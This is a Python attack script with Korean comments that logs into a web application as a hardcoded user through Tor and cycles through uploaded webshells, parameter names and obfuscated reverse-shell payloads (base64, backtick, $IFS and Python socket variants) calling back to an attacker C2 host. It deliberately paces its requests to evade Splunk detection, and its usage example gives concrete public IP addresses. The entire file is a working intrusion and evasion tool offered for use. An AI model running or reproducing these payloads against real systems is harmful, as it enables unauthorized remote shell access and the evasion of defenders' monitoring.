#!/usr/bin/env python3
"""
Splunk 탐지 자동 우회
사용자 입력 없이 모든 조합 자동 시도
"""

import requests
import sys
import time
import base64
import urllib.parse

def auto_attack(target_ip, attacker_ip, attacker_port):
    base_url = f"http://{target_ip}"

    session = requests.Session()
    session.proxies = {
        'http': 'socks5h://127.0.0.1:9050',
        'https': 'socks5h://127.0.0.1:9050'
    }

    print(f"[*] 타겟: {target_ip}")
    print(f"[*] C2: {attacker_ip}:{attacker_port}")
    print(f"[*] 전략: 자동화 Splunk 탐지 우회\n")

    # alice 로그인
    data = {'username': 'alice', 'password': 'alice2024'}
    session.post(f"{base_url}/login.php", data=data, allow_redirects=True, timeout=10)
    print("[+] alice 로그인 완료\n")

    # 웹쉘 목록
    webshells = [
        "photo.php.jpg",
        "shell_4727.php",
        "avatar_4727.jpg",
    ]

    # 파라미터 목록 (cmd 회피)
    params = ['c', 'x', 'e', 'exec', 'command']

    # 리버스 쉘 페이로드
    reverse_shell = f"bash -i >& /dev/tcp/{attacker_ip}/{attacker_port} 0>&1"
    b64_cmd = base64.b64encode(reverse_shell.encode()).decode()

    # 페이로드 목록
    payloads = [
        # Base64 인코딩
        f"echo {b64_cmd}|base64 -d|bash",

        # 백틱 난독화
        f"b`a`s`h` -i >& /dev/tcp/{attacker_ip}/{attacker_port} 0>&1",

        # 환경변수 이용
        f"bash$IFS-i$IFS>&$IFS/dev/tcp/{attacker_ip}/{attacker_port}$IFS0>&1",

        # 16진수 인코딩
        f"echo '{reverse_shell}'|$0",

        # Python 리버스 쉘
        f"python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{attacker_ip}\",{attacker_port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])'",
    ]

    print(f"[*] C2 서버에서 리스너 시작:")
    print(f"    nc -lvnp {attacker_port}\n")

    print(f"[*] 조합 테스트 시작...")
    print(f"    웹쉘: {len(webshells)}개")
    print(f"    파라미터: {len(params)}개")
    print(f"    페이로드: {len(payloads)}개")
    print(f"    총 조합: {len(webshells) * len(params) * len(payloads)}개\n")

    attempt = 0

    for shell in webshells:
        for param in params:
            for i, payload in enumerate(payloads, 1):
                attempt += 1

                print(f"\n[{attempt}] 시도 중...")
                print(f"    웹쉘: {shell}")
                print(f"    파라미터: {param}")
                print(f"    페이로드: #{i}")

                # 백그라운드 실행 추가
                bg_payload = payload + " &"

                try:
                    url = f"{base_url}/file.php?name=uploads/{shell}&{param}={urllib.parse.quote(bg_payload)}"

                    resp = session.get(url, timeout=5)

                    if resp.status_code == 200:
                        print(f"    [+] 200 OK - {len(resp.text)} bytes")

                        # 에러가 없으면 성공 가능성
                        if 'error' not in resp.text.lower() and 'not found' not in resp.text.lower():
                            print(f"    [+] ✅ 성공 가능성 높음!")
                    else:
                        print(f"    [?] Status: {resp.status_code}")

                except requests.exceptions.Timeout:
                    print(f"    [+] ✅ 타임아웃 (백그라운드 실행 가능성!)")
                except Exception as e:
                    print(f"    [-] 오류: {str(e)[:40]}")

                # URI 다변화 탐지 회피 (긴 딜레이)
                if attempt % 3 == 0:
                    print(f"\n[*] 탐지 회피 대기 (10초)...")
                    time.sleep(10)
                else:
                    time.sleep(3)

    print(f"\n{'='*60}")
    print(f"[+] 모든 조합 시도 완료!")
    print(f"[!] C2 리스너 확인하세요")
    print(f"{'='*60}")

def main():
    if len(sys.argv) < 4:
        print("사용법: python3 99_auto_splunk_evasion.py <TARGET> <ATTACKER_IP> <PORT>")
        print("예시: python3 99_auto_splunk_evasion.py 43.201.154.142 57.181.28.7 4444")
        sys.exit(1)

    target_ip = sys.argv[1]
    attacker_ip = sys.argv[2]
    attacker_port = sys.argv[3]

    auto_attack(target_ip, attacker_ip, attacker_port)

if __name__ == "__main__":
    main()
